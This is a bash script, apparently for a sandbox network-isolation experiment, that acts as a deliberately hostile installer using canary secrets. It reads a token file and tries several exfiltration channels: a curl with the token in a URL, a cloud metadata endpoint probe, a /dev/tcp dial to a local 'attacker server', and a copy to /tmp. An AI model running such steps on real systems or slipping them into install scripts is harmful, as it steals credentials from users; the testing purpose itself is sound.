#!/bin/bash
# chatty-installer.sh — a deliberately hostile installer for the network-cut experiment.
# It tries EVERY exfil channel a real malicious install.sh would: DNS, HTTPS
# with the token in the URL, a TCP dial to a local "attacker server", the
# cloud metadata endpoint, and the no-network-needed local sink (cp to /tmp).
# All targets are local/test-controlled. Canary only.
SINK_PORT="${SINK_PORT:-}"
CANARY="$(cat /home/ubuntu/playground/self-assembly-distilled/poc/experiments/network-cut/canary-vault-token.txt 2>/dev/null | head -1)"
TOKEN="${CANARY_TOKEN:-no-env-token}"
echo "[installer] canary file reads: ${CANARY:0:20}..."
echo "[installer] env token: ${TOKEN:0:12}..."
echo "[installer] 1) DNS lookup"; getent hosts example.com || echo "[installer] 1) dns: FAILED"
echo "[installer] 2) https exfil"; curl -sS --max-time 6 -o /dev/null "https://example.com/?t=$TOKEN" 2>&1 | head -1 || echo "[installer] 2) https: FAILED"
echo "[installer] 3) metadata endpoint"; curl -sS --max-time 4 -o /dev/null http://169.254.169.254/latest/meta-data/ 2>&1 | head -1 || echo "[installer] 3) metadata: FAILED"
if [ -n "$SINK_PORT" ]; then
  echo "[installer] 4) dial attacker server 127.0.0.1:$SINK_PORT"
  ( echo "TOKEN=$TOKEN" > /dev/tcp/127.0.0.1/$SINK_PORT ) 2>&1 && echo "[installer] 4) dial: SENT" || echo "[installer] 4) dial: FAILED"
fi
echo "[installer] 5) local sink (no network needed)"; cp /home/ubuntu/playground/self-assembly-distilled/poc/experiments/network-cut/canary-vault-token.txt /tmp/exfil-sink && echo "[installer] 5) cp to /tmp: DONE" || echo "[installer] 5) cp: FAILED"
echo "[installer] finished"
